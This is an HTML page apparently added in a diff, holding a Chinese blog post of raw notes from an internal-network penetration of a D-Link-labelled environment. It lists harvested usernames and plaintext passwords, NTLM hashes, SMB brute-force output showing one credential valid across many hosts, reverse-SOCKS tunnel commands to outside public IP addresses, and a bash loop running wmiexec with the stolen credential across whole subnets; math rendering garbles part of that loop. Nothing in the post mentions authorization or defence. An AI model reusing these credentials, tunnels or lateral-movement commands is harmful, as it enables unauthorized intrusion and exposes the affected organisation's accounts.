@@ -1,0 +1,419 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>渗透测试之内网渗透（D-Link） | CXAQHQ</title>
+<link rel="shortcut icon" href="https://blog.cxaqhq.cn/favicon.ico?v=1744037624894">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://blog.cxaqhq.cn/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="渗透测试之内网渗透（D-Link） | CXAQHQ - Atom Feed" href="https://blog.cxaqhq.cn/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="信息收集
+内网信息收集
+用户名
+root
+wklautoacc1
+backup
+gameac
+wkljohn
+john
+administrator
+workingmachine
+myst
+zongmux693
+kaikikai1025
+ca..." />
+    <meta name="keywords" content="渗透测试" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://blog.cxaqhq.cn">
+  <img class="avatar" src="https://blog.cxaqhq.cn/images/avatar.png?v=1744037624894" alt="">
+  </a>
+  <h1 class="site-title">
+    CXAQHQ
+  </h1>
+  <p class="site-description">
+    再努力一点！
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/badboycxcc" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/cxaqhq" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              渗透测试之内网渗透（D-Link）
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-03-06
+              </span>
+              <span>
+                12 min read
+              </span>
+              
+                <a href="https://blog.cxaqhq.cn/tag/7BFV4Er_M/" class="post-tag">
+                  # 渗透测试
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="信息收集">信息收集</h2>
+<h3 id="内网信息收集">内网信息收集</h3>
+<h4 id="用户名">用户名</h4>
+<pre><code>root
+wklautoacc1
+backup
+gameac
+wkljohn
+john
+administrator
+workingmachine
+myst
+zongmux693
+kaikikai1025
+catchithk
+waishing163163
+vincentchan0224
+
+</code></pre>
+<p>echo -e 'root\nwklautoacc1\nbackup\ngameac\nwkljohn\njohn\nadministrator\nworkingmachine\nmyst\nzongmux693\nkaikikai1025\ncatchithk\nwaishing163163' &gt; user.txt<br>
+echo -e 'root\nbackup\ngameac\nwkljohn\njohn\nadministrator\nworkingmachine\nmyst\nzongmux693\nkaikikai1025\ncatchithk\nwaishing163163' &gt; user.txt<br>
+echo -e 'root\ngameac\nwkljohn\njohn\nadministrator\nworkingmachine\nmyst\nzongmux693\nkaikikai1025\ncatchithk\nwaishing163163' &gt; user.txt</p>
+<h4 id="密码">密码</h4>
+<pre><code>fnnet3721
+joinmygame
+YnLKWhUYCQrSOjeq
+Ev95813033884422*
+Ev33884422958130*
+788290
+ev788290
+Ev12345678*
+Ev12345678
+33884422
+mystberry
+zongmux693
+kaikikai1025
+catchithk
+waishing163163
+cxc2605363
+</code></pre>
+<p>echo -e 'fnnet3721\njoinmygame\nYnLKWhUYCQrSOjeq\nEv95813033884422*\nEv33884422958130*\n788290\nEv12345678*\n33884422\nEv12345678\nmystberry\nzongmux693\nkaikikai1025\ncatchithk\nwaishing163163' &gt; pass.txt</p>
+<h4 id="爆破记录">爆破记录</h4>
+<pre><code>192.168.1.172 backup YnLKWhUYCQrSOjeq ISOK
+192.168.1.106 backup YnLKWhUYCQrSOjeq ISOK
+
+
+
+----smb----
+2023/02/17 15:52:13 Found: 192.168.0.241 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.179 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.76 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.50 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.64 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.189 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.242 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.239 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.236 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.204 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.202 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.134 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.178 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.209 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.208 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.217 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.107 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.109 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.210 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.218 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.166 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.60 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.102 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.177 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.207 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.252 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.214 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.118 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.205 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.206 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.219 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.200 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.188 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.127 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.223 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.240 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.84 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.128 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.86 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.122 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.119 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.254 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.216 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.88 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.251 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.170 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.78 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.126 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.130 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.116 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.65 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.253 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.132 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.71 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.70 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.75 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.131 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.67 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.85 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.69 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.238 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.129 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.232 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.191 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.176 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.73 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.72 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.66 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.159 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.231 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.115 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.133 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.230 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.111 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.87 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.199 wklautoacc1 Ev12345678* ISOK
+2023/02/17 15:52:13 Found: 192.168.0.74 wklautoacc1 Ev12345678* ISOK
+
+[+] SMB:192.168.1.58:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.65:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.161:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.43:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.236:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.177:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.103:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.12:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.89:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.88:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.83:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.114:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.74:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.207:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.222:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.226:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.47:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.45:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.150:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.245:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.37:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.99:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.13:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.145:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.46:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.10:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.149:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.250:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.9:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.93:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.17:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.6:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.16:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.189:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.188:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.5:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.218:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.36:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.223:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.241:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.90:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.113:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.23:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.3:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.147:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.118:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.249:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.11:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.79:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.2:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.196:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.158:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.14:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.7:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.42:445:wklautoacc1 Ev12345678*
+[+] SMB:192.168.1.4:445:wklautoacc1 Ev12345678*
+
+</code></pre>
+<h4 id="内网代理">内网代理</h4>
+<p>ew</p>
+<pre><code>Server
+./ew -s rcsocks -l 10808 -e 18888
+
+Client
+./ee -s rssocks -d 107.174.115.127 -e 18888
+
+./ee -s rssocks -d 193.29.189.231 -e 18888
+</code></pre>
+<p>wklautoacc1@Ev12345678*<br>
+wklautoacc1:Ev12345678*@192.168.0.74 &quot;whoami&quot;</p>
+<p>#!/bin/bash</p>
+<p>for((i=1;i&lt;=254;i++));<br>
+do<br>
+exec=&quot;./wmiexec wklautoacc1:Ev12345678*@192.168.0.<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>w</mi><mi>h</mi><mi>o</mi><mi>a</mi><mi>m</mi><mi>i</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">i whoami&quot;
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">h</span><span class="mord mathdefault">o</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord">&quot;</span></span></span></span>{exec}<br>
+done</p>
+<p>echo -e '#!/bin/bash\nfor((i=1;i&lt;=254;i++));\ndo\nexec=&quot;./wmiexec wklautoacc1:Ev12345678*@192.168.1.<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \n at position 10: i whoami&quot;\̲n̲'>i whoami&quot;\n</span>{exec}\ndone' &gt; run.sh;chmod +x run.sh<br>
+echo -e '#!/bin/bash\nfor((i=1;i&lt;=254;i++));\ndo\nexec=&quot;./wmiexec wklautoacc1:Ev12345678*@192.168.0.<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \n at position 10: i whoami&quot;\̲n̲'>i whoami&quot;\n</span>{exec}\ndone' &gt; run.sh;chmod +x run.sh</p>
+<h3 id="公网">公网</h3>
+<h4 id="hash">Hash</h4>
+<pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:5eff09e2254bab652671a319c318b3a1:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+wklautoacc1:1009:aad3b435b51404eeaad3b435b51404ee:0662b27fc05fd91eb80ccb2b14ad3686:::
+</code></pre>
+<h4 id="用户名密码">用户名密码</h4>
+<pre><code> * Username : wklautoacc1
+* Password : Ev95813033884422*
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a>
+<ul>
+<li><a href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">内网信息收集</a>
+<ul>
+<li><a href="#%E7%94%A8%E6%88%B7%E5%90%8D">用户名</a></li>
+<li><a href="#%E5%AF%86%E7%A0%81">密码</a></li>
+<li><a href="#%E7%88%86%E7%A0%B4%E8%AE%B0%E5%BD%95">爆破记录</a></li>
+<li><a href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86">内网代理</a></li>
+</ul>
+</li>
+<li><a href="#%E5%85%AC%E7%BD%91">公网</a>
+<ul>
+<li><a href="#hash">Hash</a></li>
+<li><a href="#%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81">用户名密码</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+
+        <div class="site-footer">
+  Backdoor
+  <a class="rss" href="https://blog.cxaqhq.cn/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
